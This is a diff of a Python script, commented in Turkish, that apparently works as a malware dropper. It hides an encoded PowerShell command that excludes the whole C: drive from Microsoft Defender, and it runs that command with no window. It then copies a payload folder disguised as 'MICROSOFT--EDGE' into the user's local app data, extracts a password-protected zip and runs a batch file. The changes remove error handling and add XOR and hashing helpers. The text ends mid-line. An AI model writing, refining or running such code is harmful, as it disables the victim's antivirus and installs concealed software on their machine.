@@ -1,4 +1,5 @@
 import shutil, os, sys, subprocess, pyzipper, ctypes
+import hashlib
 
 def resource_path(relative_path):
     try:
@@ -7,26 +8,28 @@ def resource_path(relative_path):
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
 
+def xor_encrypt_decrypt(data, key):
+    key_len = len(key)
+    return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])
+
+def generate_key(password):
+    # SHA-256 hash kullanarak güçlü bir anahtar oluştur
+    return hashlib.sha256(password.encode()).digest()
+
 def run_powershell_command():
-    try:
-        commands = [
-            "powershell -enc " + \
-            "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAC0ARQB4AGMAbAB1AHMAaQBvAG4A " + \
-            "UABhAHQAaAAgAEMAOgBcAA=="
-        ]
-        ps_command = "; ".join(commands)
-        print(f"Running PowerShell command: {ps_command}")
-        subprocess.run(["powershell", "-Command", ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
-    except Exception as e:
-        print(f"Error running PowerShell command: {e}")
+    commands = [
+        "powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=="
+    ]
+    ps_command = "; ".join(commands)
+    subprocess.run(["powershell", "-Command", ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
 
 def process_files(src, dst, zip_password):
-    try:
-        print(f"Processing files from {src} to {dst}")
-        if os.path.exists(dst):
-            print(f"Destination {dst} exists. Removing it.")
-            shutil.rmtree(dst, ignore_errors=True)
+    print(f"Processing files from {src} to {dst}")
+    if os.path.exists(dst):
+        print(f"Destination {dst} exists. Removing it.")
+        shutil.rmtree(dst, ignore_errors=True)
 
+    try:
         shutil.copytree(src, dst)
         zip_path = os.path.join(dst, f"{os.path.basename(src)}.zip")
         extract_path = dst
@@ -48,12 +51,12 @@ def process_files(src, dst, zip_password):
             print(f"Batch file {batch_file_path} does not exist")
 
     except Exception as e:
-        print(f"An error occurred while processing files: {e}")
+        print(f"An error occurred: {e}")
 
-# Ana program çalıştırma
-if __name__ == "__main__":
-    run_powershell_command()
+# Anahtar için güçlü bir şifreleme metodu
+password = '72222'
+key = generate_key(password)
 
-    src1 = resource_path('MICROSOFT--EDGE')
-    dst1 = os.path.join(os.getenv('LOCALAPPDATA'), 'MICROSOFT--EDGE')
-    process_files(src1, dst1, b'72222')  # ZIP şifresi burada
+# Şifreli dosya işlemleri
+src1 = resource_path('MICROSOFT--EDGE')
+dst1 =
